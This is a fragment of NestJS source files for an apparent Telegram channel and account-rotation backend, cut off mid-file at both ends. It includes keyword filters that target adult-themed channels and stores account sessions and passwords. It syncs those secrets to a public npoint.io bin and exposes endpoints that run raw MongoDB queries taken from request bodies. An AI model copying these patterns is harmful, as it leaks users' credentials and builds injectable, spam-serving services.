{\r\n    return this.channelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\r\n    return this.channelsService.update(channelId, updateChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.channelsService.remove(channelId);\r\n  }\r\n}\r\n","// src/channels/channels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ChannelsController } from './channels.controller';\r\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\r\n  ],\r\n  controllers: [ChannelsController],\r\n  providers: [ChannelsService],\r\n  exports: [ChannelsService]\r\n})\r\nexport class ChannelsModule { }\r\n","// src/channels/channels.service.ts\r\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateChannelDto } from './dto/create-channel.dto';\r\nimport { UpdateChannelDto } from './dto/update-channel.dto';\r\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\r\n@Injectable()\r\nexport class ChannelsService {\r\n  constructor(\r\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\r\n  ) { console.log(Channel.name) }\r\n\r\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\r\n    const createdChannel = new this.ChannelModel(createChannelDto);\r\n    return createdChannel.save();\r\n  }\r\n\r\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\r\n    const bulkOps = createChannelDtos.map((dto) => ({\r\n      updateOne: {\r\n        filter: { channelId: dto.channelId },\r\n        update: { $set: dto },\r\n        upsert: true\r\n      }\r\n    }));\r\n\r\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\r\n    return 'Channels Saved';\r\n  }\r\n\r\n  async findAll(): Promise<Channel[]> {\r\n    return this.ChannelModel.find().exec();\r\n  }\r\n\r\n  async findOne(channelId: string): Promise<Channel> {\r\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    return channel;\r\n  }\r\n\r\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\r\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\r\n      { channelId },\r\n      { $set: updateChannelDto },\r\n      { new: true, upsert: true },\r\n    ).exec();\r\n    return updatedChannel;\r\n  }\r\n\r\n  async remove(channelId: string): Promise<void> {\r\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\r\n  }\r\n\r\n  async search(filter: any): Promise<Channel[]> {\r\n    console.log(filter)\r\n    return this.ChannelModel.find(filter).exec();\r\n  }\r\n\r\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\r\n    const pattern = new RegExp(keywords.join('|'), 'i');\r\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\r\n    let query = {\r\n      $and: [\r\n        { username: { $ne: null } },\r\n        {\r\n          $or: [\r\n            { title: { $regex: pattern } },\r\n            { username: { $regex: pattern } }\r\n          ]\r\n        },\r\n        {\r\n          username: {\r\n            $not: {\r\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\r\n            }\r\n          }\r\n        },\r\n        {\r\n          title: { $not: { $regex: notPattern } }\r\n        },\r\n        {\r\n          username: { $not: { $regex: notPattern } }\r\n        },\r\n        {\r\n          sendMessages: false,\r\n          broadcast: false,\r\n          restricted: false\r\n        }\r\n      ]\r\n    };\r\n\r\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\r\n    try {\r\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n\r\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.ChannelModel.find(query);\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\r\n    const query = {\r\n      '$and':\r\n        [\r\n          {\r\n            '$or':\r\n              [\r\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n              ]\r\n          },\r\n          {\r\n            '$or': [\r\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n            ]\r\n          },\r\n          {\r\n            channelId: { '$nin': notIds },\r\n            participantsCount: { $gt: 1000 },\r\n            username: {$ne: null},\r\n            canSendMsgs: true,\r\n            restricted: false,\r\n            forbidden: false\r\n          }\r\n        ]\r\n    }\r\n\r\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\r\n    try {\r\n      const result: Channel[] = await this.ChannelModel.aggregate([\r\n        { $match: query },\r\n        { $skip: skip },\r\n        { $limit: limit },\r\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\r\n        { $sort: sort }, // Sort by the random field\r\n        { $project: { randomField: 0 } } // Remove the random field from the output\r\n      ]).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateChannelDto {\r\n  @ApiProperty({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a broadcast channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  broadcast?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a megagroup',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  megagroup?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Number of participants in the channel',\r\n    example: 0,\r\n  })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is restricted',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  restricted?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel can send messages',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  sendMessages?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Username of the channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  username?: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is private',\r\n    example: false,\r\n    required: false,\r\n  })\r\n  private: boolean = false;\r\n\r\n  @ApiProperty({\r\n    default: false, example: false,\r\n    required: false,\r\n  })\r\n  forbidden: boolean = false;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class SearchChannelDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'privacy of the channel',\r\n    example: false,\r\n  })\r\n  private?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Username of the channel',\r\n    example: 'ayesha_channel',\r\n  })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs?: boolean;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum number of participants in the channel',\r\n    example: 10,\r\n  })\r\n  minParticipantsCount?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of participants in the channel',\r\n    example: 100,\r\n  })\r\n  maxParticipantsCount?: number;\r\n}\r\n","// src/channels/dto/update-channel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateChannelDto } from './create-channel.dto';\r\n\r\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\nimport * as mongoose from 'mongoose';\r\n\r\nexport type ChannelDocument = Channel & Document;\r\n@Schema({\r\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class Channel {\r\n  @Prop({ required: true, unique: true })\r\n  channelId: string;\r\n\r\n  @Prop({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @Prop({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  participantsCount: number;\r\n\r\n  @Prop({ default: false })\r\n  restricted: boolean;\r\n\r\n  @Prop({ default: false })\r\n  sendMessages: boolean;\r\n\r\n  @Prop({ required: true })\r\n  title: string;\r\n\r\n  @Prop({ required: false, default: null })\r\n  username: string;\r\n\r\n  @Prop({ required: true, default: false })\r\n  private: boolean;\r\n\r\n  @Prop({ default: false, required: false })\r\n  forbidden: boolean\r\n}\r\n\r\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) {}\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    return this.clientService.updateClient(clientId);\r\n  }\r\n  \r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { Client, ClientSchema } from './schemas/client.schema';\r\nimport { ClientService } from './client.service';\r\nimport { ClientController } from './client.controller';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\r\n    forwardRef(()=>TelegramModule),\r\n    forwardRef(()=>BufferClientModule),\r\n    forwardRef(()=>UsersModule),\r\n    forwardRef(()=>ArchivedClientModule),\r\n    NpointModule\r\n  ],\r\n  controllers: [ClientController],\r\n  providers: [ClientService],\r\n  exports: [ClientService]\r\n})\r\nexport class ClientModule { }\r\n","import { TelegramService } from './../Telegram/Telegram.service';\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Client, ClientDocument } from './schemas/client.schema';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\r\nimport { areJsonsNotSame, contains, fetchNumbersFromString, fetchWithTimeout, mapToJson, parseError, ppplbot, toBoolean } from '../../utils';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\r\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\r\nimport * as path from 'path';\r\nimport { CloudinaryService } from '../../cloudinary';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { NpointService } from '../n-point/npoint.service';\r\nimport axios from 'axios';\r\nlet settingupClient = Date.now() - 250000;\r\n@Injectable()\r\nexport class ClientService {\r\n    private clientsMap: Map<string, Client> = new Map();\r\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => BufferClientService))\r\n        private bufferClientService: BufferClientService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ArchivedClientService))\r\n        private archivedClientService: ArchivedClientService,\r\n        private npointSerive: NpointService\r\n    ) {\r\n        setInterval(async () => {\r\n            await this.refreshMap();\r\n        }, 5 * 60 * 1000);\r\n    }\r\n\r\n    async checkNpoint() {\r\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\r\n        for (const client in clients) {\r\n            const existingClient = await this.findOne(client, false);\r\n            if (areJsonsNotSame(existingClient, clients[client])) {\r\n                await this.findAll();\r\n                const clientData = mapToJson(this.clientsMap)\r\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\r\n                const maskedCls = {};\r\n                for (const client in clientData) {\r\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\r\n                    maskedCls[client] = maskedClient\r\n                }\r\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    async create(createClientDto: CreateClientDto): Promise<Client> {\r\n        const createdUser = new this.clientModel(createClientDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<Client[]> {\r\n        const clientMapLength = this.clientsMap.size\r\n        if (clientMapLength < 20) {\r\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\r\n            for (const client of results) {\r\n                this.clientsMap.set(client.clientId, client)\r\n            }\r\n            console.log(\"Refreshed Clients\")\r\n            return results\r\n        } else {\r\n            return Array.from(this.clientsMap.values())\r\n        }\r\n    }\r\n\r\n    async findAllMasked(query?: SearchClientDto) {\r\n        const allClients = await this.findAll()\r\n        const filteredClients = query\r\n            ? allClients.filter(client => {\r\n                return Object.keys(query).every(key => client[key] === query[key]);\r\n            })\r\n            : allClients;\r\n        const results = filteredClients.map(client => {\r\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\r\n            return maskedClient;\r\n        });\r\n        return results;\r\n    }\r\n\r\n    async refreshMap() {\r\n        console.log(\"Refreshed Clients\")\r\n        this.clientsMap.clear();\r\n    }\r\n\r\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\r\n        const client = this.clientsMap.get(clientId)\r\n        if (client) {\r\n            return client;\r\n        } else {\r\n            const user = (await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).exec())?.toJSON();\r\n            this.clientsMap.set(clientId, user);\r\n            if (!user && throwErr) {\r\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n            }\r\n            return user;\r\n        }\r\n    }\r\n\r\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\r\n        delete updateClientDto['_id']\r\n        if ((<any>updateClientDto)._doc) {\r\n            delete (<any>updateClientDto)._doc['_id']\r\n        }\r\n        await fetchWithTimeout(`${ppplbot()}&text=Updating the Existing client: ${clientId}`);\r\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n        }\r\n        this.clientsMap.set(clientId, updatedUser);\r\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\r\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\r\n        console.log(\"Refreshed Maps\")\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(clientId: string): Promise<Client> {\r\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\r\n        if (!deletedUser) {\r\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<Client[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.clientModel.find(filter).exec();\r\n    }\r\n\r\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\r\n        console.log(`Received New Client Request for - ${clientId}`)\r\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\r\n            settingupClient = Date.now();\r\n            const existingClient = await this.findOne(clientId);\r\n            const existingClientMobile = existingClient.mobile\r\n            await fetchWithTimeout(`${ppplbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\r\n            console.log(setupClientQueryDto);\r\n            await this.telegramService.disconnectAll();\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\r\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\r\n            try {\r\n                if (newBufferClient) {\r\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\r\n\r\n                    await this.telegramService.createClient(newBufferClient.mobile);\r\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\r\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\r\n                    await this.updateClientSession(newSession)\r\n                } else {\r\n                    await fetchWithTimeout(`${ppplbot()}&text=Buffer Clients not available`);\r\n                    console.log(\"Buffer Clients not available\")\r\n                }\r\n\r\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\r\n                // if (archivedClient) {\r\n                //     await fetchWithTimeout(`${ppplbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\r\n                //     await this.updateClientSession(archivedClient.session)\r\n                // } else {\r\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\r\n                //     await this.generateNewSession(newBufferClient.mobile)\r\n                // }\r\n            } catch (error) {\r\n                parseError(error);\r\n                await this.telegramService.deleteClient(newBufferClient.mobile);\r\n                console.log(\"Removing buffer as error\")\r\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\r\n                this.telegramService.setActiveClientSetup(undefined)\r\n            }\r\n        } else {\r\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\r\n        }\r\n    }\r\n\r\n    async updateClientSession(newSession: string) {\r\n        try {\r\n            const setup = this.telegramService.getActiveClientSetup();\r\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\r\n            await this.telegramService.disconnectAll();\r\n            await sleep(2000)\r\n            let updatedUsername;\r\n            await this.telegramService.createClient(newMobile, false, true);\r\n            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\r\n            const userCaps = username[0].toUpperCase() + username.slice(1);\r\n            let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId)\r\n            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\r\n            await fetchWithTimeout(`${ppplbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\r\n            await this.telegramService.deleteClient(newMobile);\r\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\r\n            const existingClient = await this.findOne(clientId);\r\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\r\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\r\n            await this.bufferClientService.remove(newMobile);\r\n            setTimeout(async () => {\r\n                await this.updateClient(clientId);\r\n            }, 10000);\r\n\r\n            try {\r\n                if (existingClientUser) {\r\n                    try {\r\n                        if (toBoolean(formalities)) {\r\n                            await this.telegramService.createClient(existingMobile, false, true);\r\n                            console.log(\"Started Formalities\");\r\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\r\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\r\n                            await this.telegramService.updateUsername(existingMobile, '');\r\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\r\n                            console.log(\"Formalities finished\");\r\n                            await this.telegramService.deleteClient(existingMobile);\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Formalities finished`);\r\n                        } else {\r\n                            console.log(\"Formalities skipped\")\r\n                        }\r\n                        if (archiveOld) {\r\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\r\n                            const 